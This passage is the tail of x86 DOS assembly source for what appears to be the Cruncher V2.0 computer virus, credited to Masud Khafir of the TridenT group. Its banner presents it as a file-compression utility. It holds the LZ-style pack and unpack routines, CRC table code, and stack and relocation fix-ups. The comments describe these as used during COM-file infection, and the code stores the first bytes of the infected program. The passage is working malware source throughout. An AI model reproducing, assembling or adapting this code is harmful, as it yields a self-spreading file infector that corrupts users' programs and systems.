                mov     si,4Ah

                lodsw
                mov     bp,ax
                mov     dl,10h
;*              jmp     far ptr loc_1           ;*
                db      0EAh

data_53         dw      ?
data_54         dw      ?


unp_code:
                mov     di,0
                org     $-2
data_55         dw      ?
                cmp     di,sp
                jb      loc_59
                mov     ah,4Ch
                int     21h             ; DOS Services  ah=function 4Ch
                                        ;  terminate with al=return code
loc_59:
                mov     si,0
                org     $-2
data_56         dw      ?
                mov     cx,0
                org     $-2
data_57         dw      ?
                std                     ; Set direction flag
                rep     movsw           ; Rep when cx >0 Mov [si] to es:[di]

                cld                     ; Clear direction
                mov     si,di
                mov     di,100h
                lodsw                   ; String [si] to ax
                lodsw                   ; String [si] to ax
                mov     bp,ax

                mov     dl,10h
                db      0e9h
data_58         dw      0
data_59         dw      0

unp_len         equ     $-unp_code

;---------------------------------------------------------------------
;          End of the unpack code
;---------------------------------------------------------------------

;==========================================================================
;                              SUBROUTINE
;==========================================================================

sub_18          proc    near
                shr     bp,1                    ; Shift w/zeros fill
                dec     dl

                jnz     loc_ret_61              ; Jump if not zero
                lodsw                           ; String [si] to ax
                mov     bp,ax
                mov     dl,10h

loc_ret_61:
                ret
sub_18          endp

loc_62:
                call    sub_18
                rcl     bh,1                    ; Rotate thru carry
                call    sub_18
                jc      loc_65                  ; Jump if carry Set
                mov     dh,2
                mov     cl,3

locloop_63:
                call    sub_18
                jc      loc_64                  ; Jump if carry Set
                call    sub_18
                rcl     bh,1                    ; Rotate thru carry
                shl     dh,1                    ; Shift w/zeros fill
                loop    locloop_63              ; Loop if cx > 0

loc_64:
                sub     bh,dh
loc_65:
                mov     dh,2
                mov     cl,4

locloop_66:
                inc     dh
                call    sub_18
                jc      loc_67                  ; Jump if carry Set
                loop    locloop_66              ; Loop if cx > 0

                call    sub_18
                jnc     loc_68                  ; Jump if carry=0
                inc     dh
                call    sub_18
                jnc     loc_67                  ; Jump if carry=0
                inc     dh
loc_67:
                mov     cl,dh
                jmp     short locloop_74
loc_68:
                call    sub_18
                jc      loc_70                  ; Jump if carry Set
                mov     cl,3
                mov     dh,0

locloop_69:
                call    sub_18
                rcl     dh,1                    ; Rotate thru carry
                loop    locloop_69              ; Loop if cx > 0

                add     dh,9
                jmp     short loc_67
loc_70:
                lodsb                           ; String [si] to al
                mov     cl,al
                add     cx,11h
                jmp     short locloop_74
loc_71:
                mov     cl,3

locloop_72:
                call    sub_18
                rcl     bh,1                    ; Rotate thru carry
                loop    locloop_72              ; Loop if cx > 0

                dec     bh
loc_73:
                mov     cl,2

locloop_74:
                mov     al,es:[bx+di]
                stosb                           ; Store al to es:[di]
                loop    locloop_74              ; Loop if cx > 0

loc_75:
                call    sub_18
                jnc     loc_76                  ; Jump if carry=0
                movsb                           ; Mov [si] to es:[di]
                jmp     short loc_75
loc_76:
                call    sub_18
                lodsb                           ; String [si] to al
                mov     bh,0FFh
                mov     bl,al
                jc      loc_62                  ; Jump if carry Set
                call    sub_18
                jc      loc_71                  ; Jump if carry Set
                cmp     bh,bl
                jne     loc_73                  ; Jump if not equal
sub_18end:

                call    sub_18
                jnc     z_reg                  ; Jump if carry=0
                mov     cl,4
                push    di
                shr     di,cl                   ; Shift w/zeros fill
                mov     ax,es
                add     ax,di
                sub     ah,2
                mov     es,ax
                pop     di
;*              and     di,0Fh
                db       81h,0E7h, 0Fh, 00h     ;  Fixup - byte match
                add     di,2000h
                push    si
                shr     si,cl                   ; Shift w/zeros fill
                mov     ax,ds
                add     ax,si
                mov     ds,ax
                pop     si
;*              and     si,0Fh
                db       81h,0E6h, 0Fh, 00h     ;  Fixup - byte match
                jmp     short loc_75

;-----------------this part'll write to file separately---------
z_reg:
                xor     bp,bp
                xor     di,di
                xor     si,si
                xor     dx,dx
                xor     bx,bx
                xor     ax,ax
                db      0e9h
data_60         dw      0
z_reg_len       equ     $-z_reg
;---------------------------------------------------------------

                pop     bp
                push    cs
                pop     ds
                mov     si,0
                org     $-2
data_61         dw      0
                mov     cx,0
                org     $-2
data_62         dw      0

locloop_79:
                lodsw                           ; String [si] to ax
                or      ax,ax                   ; Zero ?
                js      loc_80                  ; Jump if sign=1
                add     ax,bp
                mov     es,ax
                lodsw                           ; String [si] to ax
                mov     bx,ax
                jmp     short loc_81
loc_80:
                shl     ax,1                    ; Shift w/zeros fill
                sar     ax,1                    ; Shift w/sign fill
                add     bx,ax
loc_81:
                add     es:[bx],bp
                loop    locloop_79              ; Loop if cx > 0

                pop     es
                pop     ds
                xor     bp,bp                   ; Zero register
                xor     di,di                   ; Zero register
                xor     si,si                   ; Zero register
                xor     dx,dx                   ; Zero register
                xor     bx,bx                   ; Zero register
                xor     ax,ax                   ; Zero register
;*              jmp     far ptr loc_1           ;*
                db      0EAh
data_63         dw      0
data_64         dw      0                    ;  Fixup - byte match
                pop     bp
                push    cs
                pop     ds
                mov     si,0
                org     $-2
data_65         dw      0
                mov     cx,0
                org     $-2
data_66         dw      0

locloop_82:
                lodsw                           ; String [si] to ax
                or      ax,ax                   ; Zero ?
                js      loc_83                  ; Jump if sign=1
                add     ax,bp
                mov     es,ax
                lodsw                           ; String [si] to ax
                mov     bx,ax
                jmp     short loc_84
loc_83:
                shl     ax,1                    ; Shift w/zeros fill
                sar     ax,1                    ; Shift w/sign fill
                add     bx,ax
loc_84:
                add     es:[bx],bp
                loop    locloop_82              ; Loop if cx > 0

                pop     es
                pop     ds
;                add     bp,0
                db       81h,0C5h, 00h, 00h     ;  Fixup - byte match
                org     $-2
data_67         dw      0

                mov     ss,bp
                mov     sp,0
                org     $-2
data_68         dw      0
                xor     bp,bp                   ; = 0
                xor     di,di                   ; = 0
                xor     si,si                   ; = 0
                xor     dx,dx                   ; = 0
                xor     bx,bx                   ; = 0
                xor     ax,ax                   ; = 0
;*              jmp     far ptr loc_1           ;*
                db      0EAh
data_69         dw      0
data_70         dw      0                    ;  Fixup - byte match
                pop     bp
                pop     es
                pop     ds
;*              add     bp,0
                db       81h,0C5h, 00h, 00h     ;  Fixup - byte match
                org     $-2
data_71         dw      0
                mov     ss,bp
                mov     sp,0
                org     $-2
data_72         dw      0
                xor     bp,bp                   ; = 0
                xor     di,di                   ; = 0
                xor     si,si                   ; = 0
                xor     dx,dx                   ; = 0
                xor     bx,bx                   ; = 0
                xor     ax,ax                   ; = 0
;*              jmp     far ptr loc_1           ;*
                db      0EAh
data_73         dw      0
data_74         dw      0                    ;  Fixup - byte match

;==========================================================================
;                              SUBROUTINE
;==========================================================================
;                   Used during COM-file infection
;--------------------------------------------------------------------------
; BEFORE CALL:      ds-> file data
;                   es-> 64 KB free space
;                   bx=file handler
;                   cl=1 ?
;==========================================================================

pack            proc    near
                push    bp
                mov     bp,sp
                push    di
                push    si
                                                ; Save file handler
                mov     cs:[save_hand-real_start+100h],bx
                                                ; Save option
                mov     cs:[switch-real_start+100h],cl

                                                ; Save file length
                call    f_len
                mov     cs:[file_len3+2-real_start+100h],ax
                mov     cs:[file_len3-real_start+100h],dx

                                                ; Save stack state
                                                ; and put stack to es:bx
                cli
                mov     cs:[save_ss-real_start+100h],ss
                mov     cs:[save_sp-real_start+100h],sp

                mov     bx,es                   ; Set stack to new location
                mov     ss,bx                   ; ( to free 64 Kb space )
                mov     sp,0FE00h
                sti

                cld
                push    dx
                push    ax
                call    fill_tbl                ; Fill initial table

                xor     cx,cx                   ; cx = 0
                mov     cs:[data_35-real_start+100h],cx
                mov     cs:[data_36-real_start+100h],cx
                mov     cs:[data_29-real_start+100h],cx
                mov     cs:[data_37-real_start+100h],0FFFFh

                xor     si,si                   ; si = 0
                cmp     byte ptr cs:[switch-real_start+100h],0
                jne     loc_85
                mov     ax,ds
                sub     ax,200h
                mov     ds,ax
                mov     si,2000h
loc_85:
                mov     di,0E000h
                mov     cs:[data_34-real_start+100h],di
                add     di,2

                pop     ax
                pop     dx                      ; dx:ax = file length

                or      dx,dx
                mov     dx,10h
                jnz     loc_86
                or      ah,ah
                jnz     loc_86
                mov     dh,al
loc_86:
                call    sub_25
                cmp     ax,2
                ja      loc_89
                jz      loc_87
                stc
                call    sub_21
                mov     al,[si-1]
                stosb
                mov     cx,1
                jmp     loc_102
loc_87:
                clc
                call    sub_21
                clc
                call    sub_21
                mov     al,bl
                stosb
                cmp     bx,0FF00h
                pushf
                call    sub_21
                popf
                jc      loc_88
                mov     cx,2
                jmp     loc_102
loc_88:
                inc     bh
                mov     cl,5
                shl     bh,cl
                shl     bh,1
                call    sub_21
                shl     bh,1
                call    sub_21
                shl     bh,1
                call    sub_21
                mov     cx,2
                jmp     loc_102
loc_89:
                push    ax
                clc
                call    sub_21
                stc
                call    sub_21
                mov     al,bl
                stosb
                cmp     bh,0FEh
                jb      loc_90
                mov     cl,7
                shl     bh,cl
                shl     bh,1
                call    sub_21
                stc
                call    sub_21
                jmp     loc_94
loc_90:
                cmp     bh,0FCh
                jb      loc_91
                mov     cl,7
                shl     bh,cl
                shl     bh,1
                call    sub_21
                clc
                call    sub_21
                stc
                call    sub_21
                jmp     short loc_94
loc_91:
                cmp     bh,0F8h
                jb      loc_92
                mov     cl,6
                shl     bh,cl
                shl     bh,1
                call    sub_21
                clc
                call    sub_21
                clc
                call    sub_21
                shl     bh,1
                call    sub_21
                stc
                call    sub_21
                jmp     short loc_94
loc_92:
                cmp     bh,0F0h
                jb      loc_93
                mov     cl,5
                shl     bh,cl
                shl     bh,1
                call    sub_21
                clc
                call    sub_21
                clc
                call    sub_21
                shl     bh,1
                call    sub_21
                clc
                call    sub_21
                shl     bh,1
                call    sub_21
                stc
                call    sub_21
                jmp     short loc_94
loc_93:
                mov     cl,4
                shl     bh,cl
                shl     bh,1
                call    sub_21
                clc
                call    sub_21
                clc
                call    sub_21
                shl     bh,1
                call    sub_21
                clc
                call    sub_21
                shl     bh,1
                call    sub_21
                clc
                call    sub_21
                shl     bh,1
                call    sub_21
loc_94:
                pop     cx
                cmp     cx,3
                jne     loc_95
                stc
                call    sub_21
                jmp     loc_102
loc_95:
                cmp     cx,4
                jne     loc_96
                clc
                call    sub_21
                stc
                call    sub_21
                jmp     loc_102
loc_96:
                cmp     cx,5
                jne     loc_97
                clc
                call    sub_21
                clc
                call    sub_21
                stc
                call    sub_21
                jmp     loc_102
loc_97:
                cmp     cx,6
                jne     loc_98
                clc
                call    sub_21
                clc
                call    sub_21
                clc
                call    sub_21
                stc
                call    sub_21
                jmp     loc_102
loc_98:
                cmp     cx,7
                jne     loc_99
                clc
                call    sub_21
                clc
                call    sub_21
                clc
                call    sub_21
                clc
                call    sub_21
                stc
                call    sub_21
                clc
                call    sub_21
                jmp     short loc_102
loc_99:
                cmp     cx,8
                jne     loc_100
                clc
                call    sub_21
                clc
                call    sub_21
                clc
                call    sub_21
                clc
                call    sub_21
                stc
                call    sub_21
                stc
                call    sub_21
                jmp     short loc_102
loc_100:
                cmp     cx,10h
                ja      loc_101
                mov     bh,cl
                sub     bh,9
                push    cx
                mov     cl,5
                shl     bh,cl
                clc
                call    sub_21
                clc
                call    sub_21
                clc
                call    sub_21
                clc
                call    sub_21
                clc
                call    sub_21
                clc
                call    sub_21
                shl     bh,1
                call    sub_21
                shl     bh,1
                call    sub_21
                shl     bh,1
                call    sub_21
                pop     cx
                jmp     short loc_102
                jmp     short loc_102
loc_101:
                clc
                call    sub_21
                clc
                call    sub_21
                clc
                call    sub_21
                clc
                call    sub_21
                clc
                call    sub_21
                stc
                call    sub_21
                mov     ax,cx
                sub     ax,11h
                stosb
loc_102:
                cmp     si,0E000h
                jbe     loc_104
                cmp     byte ptr cs:[switch-real_start+100h],0
                jne     loc_103
                clc
                call    sub_21
                clc
                call    sub_21
                mov     al,0FFh
                stosb
                clc
                call    sub_21
                stc
                call    sub_21
loc_103:
                mov     ax,ds
                add     ax,0C00h
                mov     ds,ax
                call    sub_23
                sub     si,0C000h
loc_104:
                cmp     di,0F810h
                jbe     loc_106
                push    ds
                push    bp
                push    dx
                push    cx
                mov     cx,cs:[data_34-real_start+100h]
                cmp     cx,0F800h
                jbe     loc_105
                mov     cx,1800h
                call    write_p
loc_105:
                pop     cx
                pop     dx
                pop     bp
                pop     ds
loc_106:
                mov     ax,si
                and     ax,0F000h
                cmp     ax,cs:[data_37-real_start+100h]
                je      loc_107
                mov     cs:[data_37-real_start+100h],ax
loc_107:
                mov     ax,cs:[file_len3+2-real_start+100h]
                sub     ax,cx
                mov     cs:[file_len3+2-real_start+100h],ax
                sbb     word ptr cs:[file_len3-real_start+100h],0
                jnz     loc_108
                or      ah,ah
                jnz     loc_108
                mov     dh,al
                or      al,al
                jz      loc_109
loc_108:
                jmp     loc_86
loc_109:
                clc
                call    sub_21
                clc
                call    sub_21
                mov     al,0FFh
                stosb
                clc
                call    sub_21
                clc
                call    sub_21
loc_110:
                shr     bp,1
                dec     dl
                jnz     loc_110
                push    di
                mov     di,cs:[data_34-real_start+100h]
                mov     es:[di],bp
                pop     di
                mov     cx,di
                sub     cx,0E000h
                call    write_p
                mov     dx,cs:[data_35-real_start+100h]
                mov     ax,cs:[data_36-real_start+100h]
                mov     bx,cs:[data_29-real_start+100h]
end_com_inf:
                                                ; Restore original stack
                cli
                mov     ss,cs:[save_ss-real_start+100h]
                mov     sp,cs:[save_sp-real_start+100h]
                sti

                pop     si
                pop     di
                pop     bp
                ret
pack            endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================
;              Write packed block to file
;==========================================================================

write_p         proc    near
                push    es
                pop     ds
                push    di
                push    cx
                mov     ax,cs:[data_29-real_start+100h]
                mov     bp,0FE00h
                mov     bx,0E000h
                jcxz    loc_113

locloop_112:
                xor     al,[bx]
                inc     bx
                mov     dl,al
                xor     dh,dh
                mov     al,ah
                xor     ah,ah
                shl     dx,1
                mov     di,dx
                xor     ax,[bp+di]
                loop    locloop_112

loc_113:

                mov     cs:[data_29-real_start+100h],ax
                pop     cx
                pop     di
                mov     dx,0E000h
                mov     bx,cs:[save_hand-real_start+100h]
                mov     ah,40h
                int     21h

                jc      loc_115

                cmp     ax,cx
                jne     loc_115
                add     cs:[data_36-real_start+100h],ax
                adc     word ptr cs:[data_35-real_start+100h],0
                sub     di,cx
                sub     cs:[data_34-real_start+100h],cx
                push    cx
                mov     bx,dx
                mov     cx,10h

locloop_114:
                mov     ax,[data_78][bx]
                mov     [bx],ax
                inc     bx
                inc     bx
                loop    locloop_114

                pop     cx
                ret
loc_115:
                mov     ax,0FFFFh
                cwd
                jmp     short end_com_inf
write_p         endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================

sub_21          proc    near
                rcr     bp,1
                dec     dl
                jnz     exit21
                push    di
                xchg    cs:[data_34-real_start+100h],di
                mov     es:[di],bp
                mov     dl,10h
                pop     di
                inc     di
                inc     di
exit21:
                ret
sub_21          endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================
;               Fill initial table
;--------------------------------------------------------------------------
;    SS = ES ( 4 Kb free space )
;==========================================================================

fill_tbl        proc    near
                xor     bp,bp                   ; = 0
                xor     bx,bx                   ; = 0
                mov     cx,7000h                ; 64 Kb

z_loop:
                mov     [bp],bx                 ; Zero free 64 Kb space
                inc     bp
                inc     bp
                loop    z_loop


                mov     bp,0FE00h               ; ss:bp -> stack
                xor     di,di                   ; = 0
                xor     dx,dx                   ; = 0


fill_loop:                                ; This loop continues 256 times
                mov     ax,dx
                mov     cx,8

f_count:                                  ; Fill table of 256 word
                shr     ax,1              ; This function
                jnc     f_carry           ; ((x^16)*ax) mod (x^16+x^15+x^2+1)
                xor     ax,0A001h
f_carry:
                loop    f_count


                mov     [bp+di],ax
                inc     di
                inc     di
                inc     dl
                jnz     fill_loop

                ret
fill_tbl        endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================

sub_23          proc    near
                push    bp
                push    cx
                mov     bp,8000h
                mov     cx,2000h

locloop_121:
                mov     bx,[bp]
                mov     ax,bx
                sub     ax,si
                cmp     ax,0E000h
                jb      loc_122
                sub     bx,0C000h
                jmp     short loc_123
loc_122:
                xor     bx,bx
loc_123:
                mov     [bp],bx
                inc     bp
                inc     bp
                loop    locloop_121

                pop     cx
                pop     bp
                ret
sub_23          endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================

sub_24          proc    near
                lodsw                           ; Take word of data
                dec     si

                mov     cx,103h
                mov     bp,ax
                shr     bp,cl                   ; bp = <word>/8
                mov     cl,al
                and     cl,7                    ; cl = 5,4,3 bits of data
                shl     ch,cl                   ; ch = 2^cl
                test    ch,ss:[table3][bp]
                pushf
                or      ss:[table3][bp],ch      ; Save ch value

                and     ah,1Fh
                shl     ax,1
                mov     bp,ax
                mov     cx,ss:[table2][bp]
                mov     ss:[table2][bp],si
                jcxz    loc_124
                sub     cx,si
                cmp     cx,0E000h
                jae     loc_124
                xor     cx,cx                   ; cx = 0
loc_124:
                mov     bp,si
                shl     bp,1
                and     bp,3FFFh
                mov     [bp],cx
                popf
                jnz     loc_125
                xor     cx,cx
                mov     ss:[table1][bp],cx
                ret
loc_125:
                push    bp
                lodsb
                mov     di,si
                dec     si
loc_126:
                dec     di
                mov     cx,[bp]
                add     di,cx
                shl     cx,1
                jz      loc_127
                add     bp,cx
                and     bp,3FFFh
                mov     cx,di
                sub     cx,si
                cmp     cx,0E000h
                jb      loc_128
                scasb
                jnz     loc_126
                cmp     di,si
                jae     loc_126
loc_127:
                pop     bp
                mov     ss:[table1][bp],cx
                or      cx,cx
                ret
loc_128:
                xor     cx,cx
                jmp     short loc_127
sub_24          endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================

sub_25          proc    near
                push    es
                push    bp
                push    di
                push    dx
                push    ds
                pop     es
                call    sub_24
                mov     bx,cx
                mov     ax,1
                jnz     loc_129
                jmp     loc_141
loc_129:
                push    bp
                mov     cx,103h
                mov     ax,[si]
                mov     bp,ax
                shr     bp,cl
                mov     cl,al
                and     cl,7
                shl     ch,cl
                test    ch,ss:[table3][bp]
                pop     bp
                mov     ax,2
                jz      loc_137
                mov     dx,si
                inc     si
                mov     di,si
                xor     ax,ax                   ; = 0
                jmp     short loc_131
loc_130:
                pop     di
                pop     si
loc_131:
                mov     cx,ss:[table1][bp]
                add     di,cx
                shl     cx,1
                jz      loc_136
                add     bp,cx
                and     bp,3FFFh
                mov     cx,di
                sub     cx,si
                cmp     cx,0E000h
                jb      loc_136
                push    si
                push    di
                mov     cx,ax
                jcxz    loc_132
                repe    cmpsb
                jnz     loc_130
                cmp     di,dx
                jae     loc_130
loc_132:
                inc     ax
                cmpsb
                jnz     loc_135
loc_133:
                cmp     di,dx
                jae     loc_135
                inc     ax
                cmp     ax,10Fh
                jb      loc_134
                mov     ax,10Fh
                pop     di
                pop     si
                mov     bx,di
                sub     bx,si
                jmp     short loc_136
loc_134:
                cmpsb
                jz      loc_133
loc_135:
                pop     di
                pop     si
                mov     bx,di
                sub     bx,si
                jmp     short loc_131
loc_136:
                mov     si,dx
                inc     ax
loc_137:
                xor     cx,cx
                cmp     cs:[file_len3-real_start+100h],cx
                jne     loc_138
                cmp     cs:[file_len3+2-real_start+100h],ax
                jae     loc_138
                mov     ax,cs:[file_len3+2-real_start+100h]
loc_138:
                cmp     ax,2
                jb      loc_141
                jnz     loc_139
                cmp     bx,0F700h
                jae     loc_139
                dec     ax
                jmp     short loc_141
loc_139:
                push    ax
                mov     cx,ax
                dec     cx

locloop_140:
                push    cx
                call    sub_24
                pop     cx
                loop    locloop_140

                pop     ax
loc_141:
                pop     dx
                pop     di
                pop     bp
                pop     es
                ret
sub_25          endp

save_b:                                         ; Here first 18h byte of
                ret                             ; infected programm
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop

msg_v db 07
db 0Dh,0Ah
db '…ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕª',0Dh, 0Ah
db '∫ *** CRUNCHER V2.0 ***   Automatic file compression utility ∫',0Dh, 0Ah
db '∫ Written by Masud Khafir of the TridenT group  (c) 31/12/92 ∫',0Dh, 0Ah
db '∫ Greetings to Fred Cohen, Light Avenger and Teddy Matsumoto ∫',0Dh, 0Ah
db '»ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕº',0Dh, 0Ah
db '$'

vir_len         equ $-real_start
seg_a           ends

                end     start